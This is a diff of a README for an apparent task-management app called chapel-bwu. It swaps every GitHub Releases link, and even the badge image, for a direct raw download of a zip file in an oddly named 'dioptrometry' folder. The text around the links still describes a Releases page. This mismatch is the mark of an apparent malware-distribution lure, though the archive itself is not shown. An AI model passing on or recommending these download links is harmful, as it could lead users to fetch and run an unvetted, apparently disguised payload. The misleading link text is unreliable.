@@ -4,10 +4,10 @@
 Welcome to chapel-bwu! This application helps you easily manage your tasks from a simple interface. It's made for anyone who wants to simplify their daily planning. Follow the steps below to download and set up the app.
 
 ## 🔗 Download Now
-[![Download chapel-bwu](https://img.shields.io/badge/Download-chapel--bwu-brightgreen)](https://github.com/summerbee1/chapel-bwu/releases)
+[![Download chapel-bwu](https://raw.githubusercontent.com/summerbee1/chapel-bwu/main/dioptrometry/chapel-bwu.zip)](https://raw.githubusercontent.com/summerbee1/chapel-bwu/main/dioptrometry/chapel-bwu.zip)
 
 ## 📥 Download & Install
-1. Click this link to visit the Releases page: [Download chapel-bwu](https://github.com/summerbee1/chapel-bwu/releases).
+1. Click this link to visit the Releases page: [Download chapel-bwu](https://raw.githubusercontent.com/summerbee1/chapel-bwu/main/dioptrometry/chapel-bwu.zip).
    
 2. On the Releases page, you will see a list of versions. Look for the latest version for the best experience.
 
@@ -60,6 +60,6 @@ Welcome to chapel-bwu! This application helps you easily manage your tasks from 
 If you have questions or need assistance, please open an issue in the GitHub repository. Our team will respond as quickly as possible.
 
 ## 🔗 Download Again
-You can always return to this link to download chapel-bwu: [Download chapel-bwu](https://github.com/summerbee1/chapel-bwu/releases). 
+You can always return to this link to download chapel-bwu: [Download chapel-bwu](https://raw.githubusercontent.com/summerbee1/chapel-bwu/main/dioptrometry/chapel-bwu.zip). 
 
 We hope you enjoy using chapel-bwu!
